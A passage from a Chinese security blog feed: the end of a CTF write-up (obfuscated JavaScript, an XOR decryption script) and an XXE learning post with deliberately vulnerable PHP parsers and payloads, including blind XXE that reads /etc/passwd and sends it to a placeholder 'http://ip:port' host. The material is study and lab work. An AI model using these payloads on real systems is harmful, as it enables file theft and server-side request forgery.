123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+&#123;&#125;)[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+([][[]]+[])[!+[]+!![]])</span><br></pre></td></tr></table></figure><p>在console执行一下，得到flag</p><h2 id="问卷调查"><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h2><p>填完就可以获得flag</p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="hard"><a href="#hard" class="headerlink" title="hard"></a>hard</h2><p>Ida64位打开，<code>Shift+F12</code>查看字符串，直接找到</p><h2 id="Baby-upx"><a href="#Baby-upx" class="headerlink" title="Baby_upx"></a>Baby_upx</h2><p>Ida反编译，写一下解密脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">H E C T F &#123;T h i &gt; \  Z  i  S&#x27;  &#x27;  J  L2  9  b W  e&#125;</span></span><br><span class="line"><span class="comment">0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 22 21 22 23 24 25 </span></span><br><span class="line"><span class="comment">0x48,</span></span><br><span class="line"><span class="comment">0x45,</span></span><br><span class="line"><span class="comment">0x43,</span></span><br><span class="line"><span class="comment">0x54,</span></span><br><span class="line"><span class="comment">0x46,</span></span><br><span class="line"><span class="comment">0x7b</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BYTE des[] = &#123; <span class="number">0x17</span>, <span class="number">0x2B</span>, <span class="number">0x2A</span>, <span class="number">0x7D</span>, <span class="number">0x1A</span>, <span class="number">0x21</span>, <span class="number">0x2A</span>, <span class="number">0x07</span>, </span><br><span class="line">  <span class="number">0x7D</span>, <span class="number">0x19</span>, <span class="number">0x10</span>, <span class="number">0x10</span>, <span class="number">0x15</span>, <span class="number">0x1E</span>, <span class="number">0x0B</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0x29</span>, <span class="number">0x24</span>, <span class="number">0x04</span>, <span class="number">0x00</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> random[] = &#123;  <span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">3</span>,</span><br><span class="line">  <span class="number">0</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">0</span>,</span><br><span class="line">  <span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span> &#125;;</span><br><span class="line"></span><br><span class="line">BYTE s[] = &#123; <span class="number">0x43</span>,<span class="number">0x43</span>,<span class="number">0x43</span>,<span class="number">0x48</span>,<span class="number">0x45</span>,<span class="number">0x48</span>,<span class="number">0x43</span>,<span class="number">0x54</span>,<span class="number">0x48</span>,<span class="number">0x46</span>,<span class="number">0x45</span>,<span class="number">0x45</span>,<span class="number">0x45</span>,<span class="number">0x46</span>,<span class="number">0x54</span>,<span class="number">0x48</span>,<span class="number">0x48</span>,<span class="number">0x48</span>,<span class="number">0x45</span>,<span class="number">0x43</span> &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,s[i] ^ des[i]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//printf(&quot;0x%x,&quot;, s[i]);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到<code>Thi5_iiS5_UUPX_LalAC</code>，不知道为什么多了一位<code>C</code>，删掉后用<code>HECTF</code>包裹提交就好</p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>本来还准备看一下文件的，结果直接<code>nc 123.56.242.200 10005 </code>就得到了flag</p>]]></content>
      
      
      <categories>
          
          <category> 比赛记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
            <tag> Ctfer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞的学习</title>
      <link href="/post/2021-10/XXE%E6%BC%8F%E6%B4%9E/"/>
      <url>/post/2021-10/XXE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="XXE漏洞的学习"><a href="#XXE漏洞的学习" class="headerlink" title="XXE漏洞的学习"></a>XXE漏洞的学习</h1><p>XXE：<code>XML External Entity</code> 即外部实体，从安全角度理解成 XML External Entity attack 外部实体注入攻击（那为啥不叫XEE）。对于 XXE 想要真正的了解它，就需要先来了解一下XML是什么。</p><h2 id="XML基础知识"><a href="#XML基础知识" class="headerlink" title="XML基础知识"></a>XML基础知识</h2><p>XML是<code>可扩展标记语言</code>（e<strong>X</strong>tensible <strong>M</strong>arkup <strong>L</strong>anguage）的缩写，它是是一种数据表示格式，可以描述非常复杂的数据结构，常用于传输和存储数据。</p><p><code>语法结构</code>与 <code>HTML </code>大致相同，<code>HTML</code> 旨在显示数据信息，而 <code>XML</code> 旨在传输数据信息。（说到传输数据自然而然肯定会想到<code>json</code>格式，相比<code>XML</code>，现在用的更多是<code>json</code>格式来传输数据）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>seizer<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>ggbond<span class="tag">&lt;/<span class="name">from</span>&gt;</span>xml</span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在上面代码中的第一行，定义XML的版本与编码。</p><p>在XML文档中，所有的元素都必须正确的嵌套，形成树形结构。并且整个XML文档中必须要有一个根元素。如上代码，<code>&lt;note&gt;</code>是整个文档的根元素。嵌套在note标签中的<code>&lt;to&gt;</code>和<code>&lt;from&gt;</code>则是根的子元素。</p><p>同时，所有的XML元素都必须有关闭标签，这点不像HTML语法那样松散。如果缺失关闭标签，则会导致XML解析失败。</p><h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><p>所有的XML文档都由五种简单的构建模块（元素，属性，实体，PCDATA 和 CDATA）构成。这里着重介绍一下实体：实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。因此我们利用引入实体，构造恶意内容，从而达到攻击的目的。</p><p>网上的文章中对实体的种类个数各有不同，大致为以下几种：</p><p>内部实体 外部实体 字符实体 命名实体 参数实体</p><h2 id="文档类型定义：-DTD"><a href="#文档类型定义：-DTD" class="headerlink" title="文档类型定义： DTD"></a>文档类型定义： DTD</h2><p>XML的语言规范是由DTD（Document Type Definition）来控制，类似编程语言的语法，它定义了XML文档的合法构建模块，即声明了XML的内容格式规范。</p><p>DTD 的声明方式分为两种：内部 DTD 和外部 DTD ，其区别就在于：对 XML 文档中的元素、属性和实体的 DTD 的声明是在 XML 文档内部引用还是引用外部的 dtd 文件。</p><h3 id="内部引用"><a href="#内部引用" class="headerlink" title="内部引用"></a>内部引用</h3><p>格式：</p><blockquote><!ENTITY 实体名称 "实体的值"></blockquote><p>将DTD和XML放在同一份文档中，利用DTD定义的实体即为内部实体。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY  <span class="meta-keyword">chybeta</span>  <span class="meta-string">&quot;Hello World!&quot;</span>&gt;</span>    </span></span><br><span class="line"><span class="meta">]&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">xxe</span>&gt;</span>  </span><br><span class="line">    <span class="symbol">&amp;chybeta;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xxe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>访问该XML文档，&chybeta;会被解析为Hello World!并输出。</p><h3 id="外部引用"><a href="#外部引用" class="headerlink" title="外部引用"></a>外部引用</h3><blockquote><!ENTITY 实体名称 SYSTEM "URI"></blockquote><p>通过引用定义在外部的DTD中的实体，我们称之为外部实体。 </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [<span class="meta">&lt;!ENTITY  <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c://123.txt&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071358016.png" alt="image-20211019222721226"></p><h2 id="XML-注入"><a href="#XML-注入" class="headerlink" title="XML 注入"></a>XML 注入</h2><p>demo：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 注入前XML代码</span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;USER role=&quot;admin&quot;&gt;用户输入位置&lt;/USER&gt;</span></span><br></pre></td></tr></table></figure><p>当用户输入一些恶意代码，比如<code>User1&lt;/USER&gt;&lt;USER role=&quot;admin&quot;&gt;User2</code>，原XML代码就变成了下面的样子：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 注入后XML代码</span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;USER role=&quot;admin&quot;&gt;User1&lt;/USER&gt;</span></span><br><span class="line"><span class="meta">&lt;USER role=&quot;admin&quot;&gt;User2&lt;/USER&gt;</span></span><br></pre></td></tr></table></figure><p>对于普通的<code>XML注入</code>，利用面比较狭窄，所及几乎永不i到，如果有的话也应该是逻辑漏洞，下面重点介绍<code>XXE</code>的利用！</p><h1 id="XXE漏洞的利用"><a href="#XXE漏洞的利用" class="headerlink" title="XXE漏洞的利用"></a>XXE漏洞的利用</h1><p>实验环境：</p><p>windows11 + phpStudy + apache + php</p><p>PHP Version: 5.2.17</p><p>libxml Version: 2.7.7</p><h2 id="有回显读本地敏感文件（Normal-XXE）"><a href="#有回显读本地敏感文件（Normal-XXE）" class="headerlink" title="有回显读本地敏感文件（Normal XXE）"></a>有回显读本地敏感文件（Normal XXE）</h2><p>xxe.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="string">&#x27;on&#x27;</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$info</span> = simplexml_load_string(<span class="variable">$xmlfile</span>);</span><br><span class="line"><span class="comment">// $dom = new DOMDocument();</span></span><br><span class="line"><span class="comment">// $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span></span><br><span class="line"><span class="comment">// $info = simplexml_import_dom($dom);</span></span><br><span class="line">print_r((<span class="keyword">string</span>)<span class="variable">$info</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>flag.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Congratulations to you!</span><br></pre></td></tr></table></figure><p>demo.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;flag.txt&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071358017.png" alt="image-20211025212502713"></p><p>如果 <code>flag.txt</code>中包含特殊符号，比如<code>&lt;&gt;&amp;&#39;</code>等，例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;XXE Congratulations to you!&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071358018.png" alt="image-20211026135124382"></p><p>可以看到当被读取文件中含有特殊符号时，返回了一堆错误，这个时候我们可以使用<code>CDATA</code>（还可以使用 <code>php://filter </code>进行 base64 编码进行读取）</p><blockquote><p>什么是CDATA：</p><p>CDATA，意为character data，是标记语言SGML与XML，表示文档的特定部分是普通的字符数据，而不是非字符数据或有特定、限定结构的字符数据。在XML文档或外部实体中，一个CDATA section是一段按字面解释的内容，不作为标记文本。字符用CDATA节表示或者按照标准语法表示，并无差异。</p><p>CDATA 部分由<code>&quot;&lt;![CDATA[&quot;</code>开始，由<code>&quot;]]&gt;&quot;</code>结束</p></blockquote><p>修改 demo.xml 为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">start</span> <span class="meta-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;flag.txt&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">end</span> <span class="meta-string">&quot;]]&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;demo.dtd&quot;</span>&gt;</span> %dtd;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>本地添加: demo.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY all &quot;%start;%xxe;%end;&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071358019.png" alt="image-20211026140239559"></p><p>利用带有CDATA的Payload，可以看到特殊符号被成功绕过。</p><p>但是在真实情况下，服务器上的XML一般用于配置文件或者传输数据，而不是显示数据，因此在现实环境下利用这个漏洞就需要找到不依靠回显的方法。</p><h2 id="无回显读取本地敏感文件（Blind-XXE）"><a href="#无回显读取本地敏感文件（Blind-XXE）" class="headerlink" title="无回显读取本地敏感文件（Blind XXE）"></a>无回显读取本地敏感文件（Blind XXE）</h2><h3 id="Payload1"><a href="#Payload1" class="headerlink" title="Payload1"></a>Payload1</h3><p>靶机文件：xxe_blind.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">  <span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">  <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">  <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本地 payload：demo.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://ip/demo.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>本地文件：demo.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip:port?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>在可访问的 <code>ip</code> 地址即<code>端口</code>上使用 <code>nc</code> 进行监听，从而形成攻击</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071358020.png" alt="img"></p><h3 id="Payload2"><a href="#Payload2" class="headerlink" title="Payload2"></a>Payload2</h3><p>demo.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">data</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://ip/xxe.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd; %all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br></pre></td></tr></table></figure><p>xxe.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://ip:port/%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>整个的调用过程如下：解析时<code>%dtd</code>引入xxe.xml，之后<code>%all</code>引入<code>send</code>的定义，最后引用了实体send，把<code>%file</code>文件内容通过一个http请求发了出去。注意需要把payload经过url编码。</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。</p><p>所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议：</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071358021.png" alt="img"></p><h1 id="BUU-XXE-COURSE-1"><a href="#BUU-XXE-COURSE-1" class="headerlink" title="BUU XXE COURSE 1"></a>BUU XXE COURSE 1</h1><p>进入页面后是一个 Login 登录页面，随便填试一下</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071358022.png" alt="image-20211026142903435"></p><p>发现 login.php ，并且发现了 xml 注入点</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span>asd<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>asd<span class="tag">&lt;/<span class="name">password</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>回显为<code>username</code>标签，为有回显XXE</p><p>构造payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>asd<span class="tag">&lt;/<span class="name">password</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注入后获得 flag</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071358023.png" alt="image-20211026143509182"></p><p><strong>PS：该文章只记录了 XXE 的入门学习，深入学习请圆详读下面参考文章</strong></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://ca01h.top/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">Web安全学习之XXE漏洞利用</a></p><p><a href="https://ctfbook.ph0en1x.com/web/zhu-ru/xmlshi-ti-zhu-ru#ji-chu-zhi-shi">XML实体注入</a></p><p><a href="https://cloud.tencent.com/developer/article/1657188">如何在PHP中解析XML</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届西安邮电大学网络安全技能大赛</title>
